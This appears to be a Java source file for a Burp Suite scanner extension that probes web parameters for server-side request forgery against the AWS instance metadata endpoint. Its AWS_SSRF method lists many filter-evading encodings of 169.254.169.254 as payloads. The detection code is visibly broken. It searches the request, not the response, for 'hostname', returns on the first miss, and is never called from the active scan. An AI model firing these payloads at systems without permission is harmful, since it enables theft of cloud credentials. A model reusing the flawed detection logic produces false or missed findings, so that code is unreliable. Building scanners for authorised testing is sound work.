package burp;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
/**
 *
 * @author AnoF
 */

public class CriticalIssues implements IScannerCheck {
    private IBurpExtenderCallbacks callbacks;
    private IExtensionHelpers helper;

    public CriticalIssues(IBurpExtenderCallbacks callbacks, IExtensionHelpers helper) {
        this.callbacks = callbacks;
        this.helper = helper;
    }
    
    
    
    @Override
    public List < IScanIssue > doPassiveScan(IHttpRequestResponse baseRequestResponse) {
        ArrayList < IScanIssue > issues = new ArrayList < > ();
        

        return issues;
    }

    @Override
    public List < IScanIssue > doActiveScan(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {
        ArrayList < IScanIssue > issues = new ArrayList < > ();
        
        return issues;
    }
    
    
    
     @Override
    public int consolidateDuplicateIssues(IScanIssue existingIssue, IScanIssue newIssue) {

        String existinghostname = existingIssue.getUrl().getHost();
        String newhostname = newIssue.getUrl().getHost();

        if (existingIssue.getIssueName().equals(newIssue.getIssueName())) {
            return -1;
            
        } else {
            return 0;
        }
    }
    
    
    
    private ArrayList < IScanIssue > AWS_SSRF(IHttpRequestResponse base_pair, IScannerInsertionPoint insertionPoint) {
        ArrayList < IScanIssue > issues = new ArrayList < > ();
        List<String> listOfPayload = new ArrayList<>(Arrays.asList(
                "http://169.254.169.254/latest/meta-data/",
                "http://[fd00:ec2::254]/latest/meta-data/",
                "http://instance-data/latest/meta-data/",
                "http://425.510.425.510/latest/meta-data/",
                "http://2852039166/latest/meta-data/",
                "http://7147006462/latest/meta-data/",
                "http://0xA9.0xFE.0xA9.0xFE/latest/meta-data/",
                "http://0xA9FEA9FE/latest/meta-data/",
                "http://0x41414141A9FEA9FE/latest/meta-data/",
                "http://0251.0376.0251.0376/latest/meta-data/",
                "http://0251.00376.000251.0000376/latest/meta-data/",
                "http://0251.254.169.254/latest/meta-data/",
                "http://[::ffff:a9fe:a9fe]/latest/meta-data/",
                "http://[0:0:0:0:0:ffff:a9fe:a9fe]/latest/meta-data/",
                "http://[0:0:0:0:0:ffff:169.254.169.254]/latest/meta-data/",
                "http://[fd00:ec2::254]/latest/meta-data/"
        ));
        
        for (String payload : listOfPayload) {
            System.out.println(payload);
            byte[] modified_request = insertionPoint.buildRequest(helper.stringToBytes(payload));
            IHttpRequestResponse updated_request_response = callbacks.makeHttpRequest(base_pair.getHttpService(), modified_request);
            
            MatchChecker matchChecker = new MatchChecker();
            List < int[] > matches = matchChecker.getMatches(updated_request_response.getRequest(), helper.stringToBytes("hostname"), helper);
            
            if (matches.isEmpty()) {
                return issues;
            }
            List<int[]> requestHighlights = new ArrayList<>(1);
            requestHighlights.add(insertionPoint.getPayloadOffsets(helper.stringToBytes(payload)));
            
            issues.add(new RaiseVuln(
                    base_pair.getHttpService(),
                    callbacks.getHelpers().analyzeRequest(base_pair).getUrl(),
                    new IHttpRequestResponse[] {
                        base_pair,
                        callbacks.applyMarkers(updated_request_response, requestHighlights, matches)
                    },
                    "AlphaScan - AWS SSRF",
                    "The application is vulnerable to Server-Side Request Forgery (SSRF) via an AWS endpoint. The SSRF vulnerability allows an attacker to make unauthorized requests to internal or external systems. The SSRF vulnerability was detected when probing the endpoint<br><br>" + payload + "<br><br>The response from this endpoint contained sensitive information such as 'hostname'.",
                    "Certain",
                    "High"
                ));
            
        }
        
        return issues;
    
    
    }

}